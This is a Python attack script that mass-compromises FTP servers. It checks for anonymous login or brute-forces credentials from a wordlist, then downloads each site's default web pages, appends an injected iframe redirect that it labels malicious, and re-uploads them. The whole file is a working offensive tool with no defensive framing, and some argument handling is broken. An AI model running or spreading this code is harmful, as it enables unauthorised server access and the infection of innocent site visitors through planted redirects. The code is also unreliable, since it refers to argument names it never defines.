import ftplib
import argparse
import time


def anon_login(hostname):
    ftp = ftplib.FTP(hostname)
    try:
        ftp.login('anonymous', 'me@your.com')
        print(f'\n[*] {str(hostname)} FTP Anonymous Logon Succeeded.')
        return True
    except Exception as e:
        print(f'\n[-] {str(hostname)} FTP Anonymous Logon Failed.')
        print(f'[-] Exception: {e}')
        return False
    finally:
        ftp.quit()


def brute_login(hostname, passwd_file):
    with open(passwd_file) as file:
        ftp = ftplib.FTP(hostname)
        for line in file.readlines():
            time.sleep(1)
            username = line.split(':')[0]
            password = line.split(':')[1].strip('\r').strip('\n')

            print(f'[+] Trying: {username}/{password}')

            try:
                ftp.login(username, password)
                print(f'\n[*] {str(hostname)} FTP Logon Succeeded: '
                      f'{username}/{password}')
                ftp.quit()
                return username, password
            except Exception as e:
                print(f'[-] Exception: {e}')
                pass

        print('\n[-] Could not brute force FTP credentials.')
        return None, None


def return_default(ftp):
    try:
        dir_list = ftp.nlst()
    except Exception as e:
        print(f'[-] Could not list directory contents.\n'
              f'[-] Skipping To Next Target.\n'
              f'[-] Exception: {e}')
        return

    ret_list = []
    for file in dir_list:
        fn = file.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn:
            print(f'[+] Found default page: {file}')
        ret_list.append(file)
    return ret_list


def inject_page(ftp, page, redirect):
    with open(page + '.tmp', 'w') as file:
        ftp.retrlines('RETR ' + page, file.write)
        print(f'[+] Downloaded Page: {page}')
        file.write(redirect)

    print(f'[+] Injected Malicious IFrame on: {page}')

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print(f'[+] Uploaded Injected Page: {page}')


def attack(username, password, host, redirect):
    ftp = ftplib.FTP(host)
    ftp.login(username, password)
    def_pages = return_default(ftp)
    for def_page in def_pages:
        inject_page(ftp, def_page, redirect)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 ftp_mass_compromise.py TARGET_HOST[S] '
              '-r REDIRECT_PAGE [-f USERPASS_FILE]')

    parser.add_argument('tgt_hosts', type=str, metavar='TARGET_HOST[S]',
                        nargs='+', help='specify one or more target hosts '
                                        'separated by commas (no spaces)')
    parser.add_argument('-r', type=str, metavar='REDIRECT_PAGE', required=True,
                        help='specify a redirection page')
    parser.add_argument('-f', type=str, metavar='USERPASS_FILE',
                        help='specify user/password file for brute-force '
                             'attack')

    args = parser.parse_args()
    tgt_hosts = str(args.tgt_hosts).split(',')
    pass_file = args.pass_file
    redirect_html = args.redirect_html

    for tgt_host in tgt_hosts:
        user, passwd = None, None

        if anon_login(tgt_host):
            user = 'anonymous'
            passwd = 'me@your.com'
            print('[+] Using Anonymous Creds to attack')
            attack(user, passwd, tgt_host, redirect_html)

        elif pass_file:
            (user, passwd) = brute_login(tgt_host, pass_file)
            if passwd:
                print(f'[+] Using Brute-forced Creds {user}/{passwd} to '
                      f'attack')
                attack(user, passwd, tgt_host, redirect_html)
